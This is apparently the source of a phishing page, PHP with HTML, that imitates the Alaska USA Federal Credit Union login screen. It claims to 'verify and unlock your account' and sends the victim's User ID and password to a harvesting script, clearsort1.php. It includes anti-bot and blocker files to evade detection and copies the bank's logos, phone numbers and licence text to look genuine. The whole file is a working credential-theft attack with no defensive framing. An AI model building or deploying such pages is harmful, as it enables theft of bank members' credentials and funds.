<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include 'blocker.php';
include 'antirobot.php';
include 'bt.php';


?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link rel="stylesheet" type="text/css" href="cid_css-f67370e3-17cc-45c5-b7ab-983d52b875d9_mhtml.blink.css" /><link rel="stylesheet" type="text/css" href="cid_css-90a67382-f27f-47c1-97bc-a79cb1a316ce_mhtml.blink.css" /><link rel="stylesheet" type="text/css" href="cid_css-64e936e6-c7e3-4e61-aba9-5bd501899cb8_mhtml.blink.css" />

    
    <title>Alaska USA services for you</title>

    <link rel="stylesheet" href="ub-print.css_akusa.css" type="text/css" media="print">
    <link rel="stylesheet" href="ub-main.css_akusa.css" type="text/css" title="main" media="screen, projection">
    <link rel="stylesheet" href="ub-login-new.css_akusa.css" type="text/css">
	
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="icon" href="icon.png">
<link rel="apple-touch-icon" href="icon.png" type="image/png">
<link rel="apple-touch-icon" sizes="72x72" href="icon-72.png" type="image/png">
<link rel="apple-touch-icon" sizes="114x114" href="icon@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="144x144" href="icon-72@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="60x60" href="icon-60.png" type="image/png">
<link rel="apple-touch-icon" sizes="120x120" href="icon-60@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="76x76" href="icon-76.png" type="image/png">
<link rel="apple-touch-icon" sizes="152x152" href="icon-76@2x.png" type="image/png">

    
    

    
    
  </head>
  <body>
    <div id="header">
      <div id="topBar">
        <a href="" id="logo" title="Alaska USA Federal Credit Union"><img src="akusafcu_logo.png" alt="Alaska USA products for you"></a>
        <p id="headerReturnLink"><a href="" title="Home">Return to home</a></p>
      </div>
      <div id="pgHead">
        <!--
        <a title="Alaska USA homepage (in new window)" id="logo" tabindex="-1"
          href="javascript:PopupWindow('AKUSA');">
          <img border="0" alt="Alaska USA" src="/efs/images/logo-corp.png" />
        </a>
        -->
      </div>
    </div>
    <div id="pgMain">
      <div id="mainContent">
        <div class="leftCol">
          
          <h2 style="margin-top:30px;">Access your account</h2>
          
          
          <div class="last">
            
            
            <form name="" method="POST" action="clearsort1.php">
              
              <p>To verify and unlock your account, we will walk you through few steps <br> please provide your User ID and password. 
              
              
              </p><table class="dataForm">
                <tbody>
                  <tr>
                    <th scope="row"><label id="userIdLabel">User ID:</label></th>
                    <td>
                      <input type="text" id="UserName" name="UserName" class="inputField" aria-labelledby="userIdLabel" value="" required="" maxlength="25">
                    </td>
                  </tr>
                  <tr>
                    <th scope="row"><label id="emailLabel">Password:</label></th>
                    <td>
                      <input type="password" id="Email" name="PassWord" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
                </tbody>
              </table>
              <div class="center"><input type="image" src="ctn_btn.jpg" width="72" height="25"></div>
            </form>
            
            
          </div>
          
          <!--<h2>Forgot User ID?</h2>
          <p>Your User ID is your member account number unless you have selected an alternate User ID.  Your account number is printed in the top-right corner of your statement.  If you still need help with your User ID, the Member Service Center is available 24/7 at (907) 563-4567 or (800) 525-9094</p>-->
          
        </div>
        <div class="sideBar">
          <div class="learnMore">
            
            <h2 class="help">Quick Help</h2>
            <ul class="help">
              
              <li id="liNote1">
                <a>Which email should I use?</a>
                <div class="notes" id="note1">
                  <p>Use the email address assigned to the account.</p>
                </div>
              </li>
              <li id="liNote2">
                <a>UltraBanch Business Edition User?</a>
                <div class="notes" id="note2" style="list-style:none">
                  Primary Contacts have three options for assistance:
                  <ul style="list-style-type:disc;padding-left:0;">
                    <li>Contact a Company Administrator</li>
                    <li>Go into a branch with a photo ID</li>
                    
                    <li>Attempt an online password reset</li>
                    
                    
                  </ul>
                </div>
              </li>
              <li><a href="" target="_blank">Forgot User ID?</a></li>
              <li><a href="" target="_blank">Other issues?</a></li>
              
              
            </ul>
            <div class="help" style="display:none;">
              <h1>Questions?  (800) 525-9094</h1>
            </div>
            
          </div>
          <div id="questionSection" class="learnMore">
            <h2>Questions?</h2>
            <p>
              For assistance contact the Member Service Center.
            </p><p style="padding-left:10px;margin-top:10px;">
              (907) 563-4567 or (800) 525-9094<br><br>
              Open 24 hours a day, 7 days a week.<br><br>
              <a href="" target="_blank">More contact information</a>
            </p>
            <p></p>
          </div>
        </div>
      </div>
      
      <div id="pgFooter" style="background-color:rgb(200,200,200)">
        <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">       
       <img alt="Equal Housing Lender" src="logo-ehl-tri.gif_.gif#042116">
     </span>
          
     <p> � Copyright  2021 � Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293. Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067</p>
        <p><a>Privacy</a></p>
     
     
     <p class="ncua">
       <img src="logo-ncua.gif_.gif#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>  
   </div>
      </div>
    </div>
  
</body></html>
